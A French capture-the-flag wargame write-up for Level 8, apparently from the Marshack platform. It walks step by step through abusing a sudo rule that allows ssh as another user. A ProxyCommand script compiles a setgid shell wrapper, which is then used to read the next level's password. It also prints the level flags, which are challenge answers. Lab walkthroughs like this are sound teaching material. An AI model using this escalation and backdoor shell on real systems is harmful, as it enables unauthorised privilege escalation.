# Write up : Wargames

### Level 8

Consigne :

```
Consignes lvl8 :<br>
Le but est d'exploiter le binaire visible via la commande 'sudo -l'.<p><br>

Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge8@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```

Connexion 

```bash
ssh -p 6666 challenge8@game1.marshack.fr
password: MARS{Cokc99wSsqhtmh7ZprKiE4Kym19ZuxZv}
```



Une élévation de privilège via ssh, très tricky mais efficace.

```
challenge8@be9f0e178887:~$ sudo -l

réponse:
L'utilisateur challenge8 peut utiliser les commandes suivantes sur ebeca72eddc8 :
    (challenge9) NOPASSWD: /usr/bin/ssh

```

Etapes :

- Création du fichier payloadSsh.sh dans le répertoire /tmp/test2/
- Création du fichier shell.c dans le répertoire /tmp/test2/
- Exécution de la commande sudo qui va générer le fichier shell suid 

```bash
challenge8@be9f0e178887:~$ mkdir /tmp/test2
challenge8@be9f0e178887:~$ chmod 777 /tmp/test2
challenge8@be9f0e178887:~$ cd /tmp/test2
challenge8@be9f0e178887:/tmp/test2$ echo -e '#!/bin/bash\ngcc /tmp/test2/shell.c -o /tmp/test2/shell\nchmod 2511 /tmp/test2/shell' > /tmp/test2/payloadSsh.sh
challenge8@be9f0e178887:/tmp/test2$ echo -e '#include <stdio.h>\n#include <string.h>\nint main(int argc, char* argv[]) {\n\tsetregid(getegid(), getuid());\n\tsystem("/bin/bash");\n}' > /tmp/test2/shell.c
challenge8@be9f0e178887:/tmp/test2$ chmod 777 -R /tmp/test2/{payloadSsh.sh,shell.c}
challenge8@be9f0e178887:/tmp/test2$ sudo -u challenge9 /usr/bin/ssh -o ProxyCommand="/tmp/test2/payloadSsh.sh" 127.0.0.1
```

```
réponse :
 ssh_exchange_identification: Connection closed by remote host
```



Aprés l'exécution des commandes bash, le binaire shell est suid 

```
challenge8@7051d181892c:/tmp/test2$ cd /tmp/test2
challenge8@7051d181892c:/tmp/test2$ ls -l

-rwxrwxrwx 1 challenge8 challenge8   83 févr.  6 12:59 payloadSsh.sh
-r-x--s--x 1 challenge9 challenge9 8720 févr.  6 12:59 shell
-rwxrwxrwx 1 challenge8 challenge8  130 févr.  6 12:59 shell.c

```

Exécuter le binaire et verifier l'id :

```
./shell

bash-4.3$ id 
  uid=1007(challenge8) gid=1008(challenge9) groupes=1007(challenge8)

```
Enfin allons lire le fichier demandé :

```bash
bash-4.3$ cat /etc/wargames_pass/level9/level9_password
MARS{9QujEQOSZFrRf2PAhHre9KbUFfvVeox1}

Résultat : MARS{9QujEQOSZFrRf2PAhHre9KbUFfvVeox1}
```